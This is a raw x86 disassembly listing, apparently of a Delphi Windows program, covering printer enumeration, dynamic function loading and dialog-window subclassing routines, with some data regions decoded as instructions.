mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_42701c
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4270e8
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_4040f0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4270e8
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_408d28
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_42701c
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_427a78
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427c55
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_407ac0
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_427c15
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_42701c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_402704
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_427838
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40cc64
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405a5c
mov eax [ ebp - 0x41c ]
call sub_427050
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_4043b8
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x8 ]
call sub_4043b8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4274fc
call sub_40395c
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_4040f0
mov edx [ ebp - 0x420 ]
pop eax
call sub_407d5c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427c5c
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_403f1c
retn
sub_427c78
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40d1c0
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403124
inc edi
dec ebx
jne r-xdata
sub_427ce0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427d11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427d18
retn
mov eax [ rw-data ]
call sub_403124
sub_427d24
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_427d58
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_427d80
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
mov eax r-xdata
mov [ rw-data ] eax
sub_428002
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428029
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428030
retn
sub_428045
add [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4004280 ] bl
add [ eax ] al
add [ eax + 0x6c004010 ] bh
xor eax [ eax ]
js r-xdata
add [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
add [ edx ] 0x1c
add [ eax ] al
add [ eax + eax * 4 + 0x42 ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pop eax
add [ edx ] sub_428188
xchg esp eax
add [ edx ] 0x72435410
imul esi [ ecx + ebp * 2 + 0x63 ] 0x65536c61
arpl [ ecx + ebp * 2 + 0x6f ] si
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] dl
add [ edx ] sub_428114
push cs
push esp
push ebx
jns r-xdata
outsb
lea eax [ eax ]
retn
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0xc ] si
sub_428118
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f4
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_428158
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4281b0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4281d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4281dc
retn
sub_4281e8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4281a0
xor eax eax
push ebp
push sub_42839f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4283a6
mov eax [ rw-data ]
call sub_4281a8
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_4283a8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_4281a0
xor eax eax
push ebp
push sub_42875b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428762
mov eax [ rw-data ]
call sub_4281a8
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_428b0c
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_428b34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428b7c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428b83
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403124
call sub_4281e8
cmp [ rw-data ] 0x0
jg r-xdata
sub_428ba4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428bc9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428bd0
retn
sub_428bdc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428c01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c08
retn
sub_428c14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428c39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c40
retn
sub_428c4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428c71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428c78
retn
sub_428c84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428ca9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428cb0
retn
sub_428cbc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428ce1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428ce8
retn
sub_428d25
dec [ ebx - 0x1374aa40 ]
xor eax eax
push ebp
push sub_428d4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428d54
retn
sub_428d90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428db5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428dbc
retn
sub_428dc8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428ded
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428df4
retn
sub_428e00
dec esp
mov es [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ esi + 0x42 ] 0x0
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 - 0x7153ffbe ] cl
inc edx
add [ eax ] bl
add [ eax ] al
aam 0x29
inc ecx
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x2bffbfcd ] al
movsb [ edi ] [ esi ]
inc edx
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax - 0x5c ] bh
inc edx
add [ eax ] al
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x23ffbe53 ] bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax ] dh
movsb [ edi ] [ esi ]
inc edx
add [ eax - 0x5b ] bl
inc edx
add [ esp - 0x5a5bffbe ] ch
inc edx
add [ eax + 0x29 ] ch
inc eax
add [ 0x10000200 ] al
add [ edx - 0x11001100 ] eax
jmp [ eax - 0x5b ]
sub_4294ee
xchg esp eax
inc edx
add [ edx ] cl
arpl [ esi + eax * 2 + 0x75 ] sp
insb
insb
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
outsb
adc [ ebx + 0x64 ] esp
push eax
jb r-xdata
add [ eax ] al
imul esp [ ecx + 0x6c ] 0x408d676f
add ah bh
xchg ebp eax
inc edx
add [ edi ] al
or al 0x54
inc ebx
outsd
insb
outsd
jb r-xdata
xchg ebp eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
adc [ eax ] al
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
add eax 0x336c7443
inc esp
insb
and [ ecx ] al
pushad
add [ eax ] al
jmp [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ 0x6f6c6f43 ] al
jb r-xdata
imul esp [ ecx + 0x6c ] 0x95a8676f
inc edx
add [ esi + ecx * 4 + 0x90042 ] bh
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] dl
rol [ ecx ] 0x58
add [ eax ] al
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
outsb
je r-xdata
dec edi
jo r-xdata
jne r-xdata
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax - 0x50 ] ah
inc edx
add [ eax - 0x5b ] bl
inc edx
add [ esp - 0x5a5bffbe ] ch
inc edx
add [ eax - 0x4e ] ch
inc edx
add [ esp + edx * 2 ] cl
inc ebx
outsd
insb
outsd
jb r-xdata
mov dl 0x41
imul ebp [ edi + 0x6e ] 0x94cc0173
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
xchg ebp eax
inc edx
add [ eax + eax ] ah
insb
dec edi
jo r-xdata
add [ eax ] al
mov es [ edx ]
in al dx
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x6442d816
add [ eax ] al
outsb
or ah [ ebx + 0x64 ]
push ebx
push 0x6548776f
insb
jo r-xdata
or ah [ ebx + 0x64 ]
inc ecx
outsb
jns r-xdata
arpl [ ebx + edx * 2 + 0x6f ] sp
insb
imul esp [ ebx + eax * 2 + 0x6f ] 0xa726f6c
arpl [ ecx + eax * 2 + 0x6e ] sp
add [ eax ] al
outsd
insb
outsd
jb r-xdata
lea eax [ eax ]
inc eax
xchg ebp eax
inc edx
add [ esi ] al
adc edx [ ebx + eax * 2 + 0x6f ]
insb
outsd
jb r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x8d73676f
inc eax
add [ eax - 0x6b ] al
inc ecx
add [ eax - 0x2bffbfcd ] al
movsb [ edi ] [ esi ]
inc edx
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax + esi * 4 + 0x48000042 ] ah
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add [ eax - 0x23ffbe53 ] bl
xor eax [ eax ]
inc eax
stosd [ edi ]
imul esp [ ecx + 0x6c ] 0x704f676f
je r-xdata
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah bl
outsd
outsb
jae r-xdata
inc edx
add [ ebx + 0x4295a8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
int3
sub_42a314
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45ae68
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_457408
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_457408
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_45ab6c
mov edi eax
mov eax ebx
call sub_45ab50
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_45ab38
mov edi eax
mov eax ebx
call sub_45ab84
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_42a3c8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42a314
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42a430
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41aa7c
mov [ esi + 0x30 ] 0x1
push esi
push sub_42a50c
call sub_41bb0c
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a478
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aac8
test bl bl
jle r-xdata
call sub_41bba4
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_42a4ac
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_45d85c
mov cl 0x1
sub_42a4d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403374
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42a50c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a536
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
